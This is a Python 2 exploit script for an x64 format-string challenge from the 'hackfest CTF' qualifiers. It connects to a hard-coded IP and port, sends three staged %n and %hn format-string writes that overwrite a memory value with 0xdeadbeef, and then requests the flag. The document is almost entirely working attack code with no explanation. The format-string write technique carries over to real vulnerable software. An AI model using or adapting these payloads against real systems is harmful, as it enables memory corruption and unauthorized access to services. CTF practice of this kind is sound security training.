import struct
from socket import *
import time

s = socket(AF_INET, SOCK_STREAM)
s.connect(('164.132.103.207', 5001))
'''
hackfest CTF quals, format string x64 exploitation 
'''
admin = 0xdeadbeef
add = 0x6014C2
ls = admin & 0xffff
lb = admin >> 16
admin_dec = int(add)
ls_dec = int(ls)
lb_dec = int(lb)

print s.recv(100)

fmt = "%"+str(admin_dec)+"c%76$n"
fmt2 = "%"+str(lb_dec)+"c%120$hn"
fmt3="%"+str(ls_dec)+"c%75$hn"

print "[*] 1st stage : write to stack"
s.send(fmt+"\n")
s.recv(1024)
print "[*] 2nd stage : write to bss"
s.send(fmt2+"\n")
s.recv(1024)
print "[*] 3rd stage : write to bss"
s.send(fmt3+"\n")
s.recv(1024)
print "[!] give me flag"
s.send("flag\n")
time.sleep(1)
x =  s.recv(512)
print "the flag is: S%s"%x 
